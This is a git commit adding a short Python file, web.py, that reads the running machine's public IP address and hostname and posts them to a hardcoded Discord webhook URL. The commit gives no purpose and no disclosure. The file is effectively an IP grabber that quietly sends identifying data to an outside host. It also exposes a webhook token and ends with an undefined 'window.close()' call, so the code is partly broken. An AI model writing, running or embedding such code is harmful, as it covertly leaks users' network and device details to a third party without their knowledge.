928fa896e92e703f4f82c89a8762afdc8f8d9425
ArekLubiPlacki <73820602+ArekLubiPlacki@users.noreply.github.com>
2024-01-07 19:22:36 +0100

    Add files via upload

---
+++ web.py
@@ -0,0 +1,23 @@
+import os
+from discord_webhook import DiscordWebhook
+import socket
+import webbrowser
+import requests
+ 
+def get_ip_address():
+    url = 'https://api.ipify.org'
+    response = requests.get(url)
+    ip_address = response.text
+    return ip_address
+ip = get_ip_address()
+pc = socket.gethostname()
+
+
+
+
+
+webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1193494516418740345/vwTwT9DLSjlpX1jqMs0rMbIkCtqzrJuuQ-d2QCtnb16vmvD5sQal1cv_rmLwaXm4sOpO", content="Webhook triggered by " + pc + " " + ip)
+response = webhook.execute()
+
+
+window.close()
